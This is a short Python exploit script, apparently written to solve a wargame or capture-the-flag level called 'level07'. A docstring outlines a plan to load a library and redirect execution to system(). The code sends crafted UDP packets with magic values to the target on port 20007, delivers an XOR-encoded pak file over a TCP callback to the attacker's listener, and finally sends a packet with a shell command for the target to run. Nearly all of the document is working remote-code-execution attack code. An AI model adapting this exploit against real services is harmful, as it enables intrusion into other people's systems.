'''
allocate path
allocate data
imm len(data)
writelib
allocate path
dlopen
ok

can also replace in plt of level07 parse_pak?
get regops
add 4
get system
write
allocate command
call
'''

import time
import re
import struct
from socket import *

from tqdm import tqdm

PORT = 20007


def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('local_ip')
    parser.add_argument('ip')
    parser.add_argument('pakfile')
    args = parser.parse_args()
    local_ip = args.local_ip
    ip = args.ip

    # get and encrypt pak
    data = open(args.pakfile, 'rb').read()
    data = bytes([0x41 ^ c for c in data])

    srv = socket()
    srv.bind((local_ip, 0))
    _, local_port = srv.getsockname()
    srv.listen(5)

    u = socket(AF_INET, SOCK_DGRAM)

    u.sendto(struct.pack('<I', 1347961165) + b'%s|%d|AAAAAAAA' % (local_ip.encode(), local_port), (ip, PORT))
    print('accepting...')
    s_alloc, _ = srv.accept()
    s_alloc.send(struct.pack('<I', 0x10000000) + b'AAAA')
    # input('after alloc')

    u.sendto(struct.pack('<I', 1347961165) + b'%s|%d|AAAAAAAA' % (local_ip.encode(), local_port), (ip, PORT))
    # input('after sendto2')
    print('accepting...')
    s, _ = srv.accept()
    # input('after accept2')
    s.sendall(struct.pack('<I', len(data)) + data)

    s.close()

    time.sleep(1)
    print('jump to main')
    u.sendto(struct.pack('<I', 2280059729) + b'foobar', (ip, PORT))

    time.sleep(1)
    input('try...')
    u.sendto(struct.pack('<I', 2280059729) + b'echo win___ > /tmp/win07', (ip, PORT))

    input('before s_alloc close...')
    s_alloc.close()


if __name__ == '__main__':
    main()

